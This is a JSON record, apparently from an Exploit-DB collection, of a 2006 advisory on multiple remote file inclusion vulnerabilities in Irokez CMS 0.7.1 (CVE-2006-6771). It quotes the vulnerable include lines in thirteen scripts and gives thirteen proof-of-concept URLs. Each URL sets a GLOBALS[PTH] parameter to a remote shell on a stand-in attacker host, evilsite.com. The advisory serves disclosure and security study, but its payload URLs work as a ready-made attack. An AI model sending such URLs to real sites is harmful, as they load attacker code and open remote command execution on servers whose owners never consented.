{
  "id": "3007",
  "title": "Irokez Blog 0.7.1 - Multiple Remote File Inclusions",
  "cve": "CVE-2006-6771",
  "vuln_type": "unknown",
  "code": "+-------------------------------------------------------------------------------------------\r\n+ Irokez CMS <= 0.7.1 Multiple Remote File Include Vulnerabilities\r\n+-------------------------------------------------------------------------------------------\r\n+ Vendor ............: http://www.irokez.org/\r\n+ Affected Software .: Irokez CMS <= 0.7.1\r\n+ Download ..........: http://www.irokez.org/releases/irokez-0.7.1.zip\r\n+ Description .......: \"Irokez is a blogging based CMS\"\r\n+ Class .............: Remote File Inclusion\r\n+ Risk ..............: High (Remote File Execution)\r\n+ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>\r\n+-------------------------------------------------------------------------------------------\r\n+ Details:\r\n+ Irokez CMS has several scripts which do not initialize variables before using them to include\r\n+ files, assuming register_globals = on, we can initialize any one of the variables in a query\r\n+ string and include a remote file of our choice.\r\n+\r\n+ Vulnerable Code:\r\n+ scripts/gallery.scr.php, line(s) 11-12:\r\n+ -> 11: require_once \"{$GLOBALS['PTH']['func']}gallery.func.php\";\r\n+ -> 12: require_once \"{$GLOBALS['PTH']['classes']}gallery.class.php\";\r\n+ scripts/sitemap.scr.php, line(s) 13:\r\n+ -> 13: include_once $GLOBALS['PTH']['classes'] . 'menu.class.php';\r\n+ scripts/news.scr.php, line(s) 11:\r\n+ -> 11: require_once $GLOBALS['PTH']['classes'] . 'news.class.php';\r\n+ scripts/polls.scr.php, line(s) 03:\r\n+ -> 03: require_once $GLOBALS['PTH']['classes'] . 'poll.class.php';\r\n+ scripts/rss.scr.php, line(s) 04:\r\n+ -> 04: require_once \"{$GLOBALS['PTH']['classes']}news.class.php\";\r\n+ scripts/search.scr.php, line(s) 04:\r\n+ -> 04: require_once \"{$GLOBALS['PTH']['classes']}content.class.php\";\r\n+ scripts/xtextarea.scr.php, line(s) 03-04:\r\n+ -> 03: $GLOBALS['spaw_root'] = $spaw_root = $GLOBALS['PTH']['spaw'];\r\n+ -> 04: require_once $GLOBALS['PTH']['spaw'] . 'spaw_control.class.php';\r\n+ functions/form.func.php, line(s) 03:\r\n+ -> 03: require_once \"{$GLOBALS['PTH']['classes']}lang.class.php\";\r\n+ functions/general.func.php, line(s) 06:\r\n+ -> 06: require_once \"{$GLOBALS['PTH']['classes']}lang.class.php\";  //TBL_Lang description\r\n+ functions/groups.func.php, line(s) 03:\r\n+ -> 03: require_once \"{$GLOBALS['PTH']['classes']}group.class.php\";\r\n+ functions/js.func.php, line(s) 04:\r\n+ -> 04: require_once \"{$GLOBALS['PTH']['classes']}lang.class.php\";\r\n+ functions/sections.func.php, line(s) 03:\r\n+ -> 03: require_once \"{$GLOBALS['PTH']['classes']}section.class.php\";\r\n+ functions/users.func.php, line(s) 03:\r\n+ -> 03: require_once \"{$GLOBALS['PTH']['classes']}user.class.php\";\r\n+\r\n+ Proof Of Concept:\r\n+ http://[target]/[path]/scripts/gallery.scr.php?GLOBALS[PTH][func]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/scripts/sitemap.scr.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/scripts/news.scr.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/scripts/polls.scr.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/scripts/rss.scr.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/scripts/search.scr.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/scripts/xtextarea.scr.php?GLOBALS[PTH][spaw]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/functions/form.func.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/functions/general.func.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/functions/groups.func.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/functions/js.func.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/functions/sections.func.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?\r\n+ http://[target]/[path]/functions/users.func.php?GLOBALS[PTH][classes]=http://evilsite.com/shell.php?\r\n+-------------------------------------------------------------------------------------------\r\n\r\n# milw0rm.com [2006-12-25]",
  "url": "https://www.exploit-db.com/exploits/3007"
}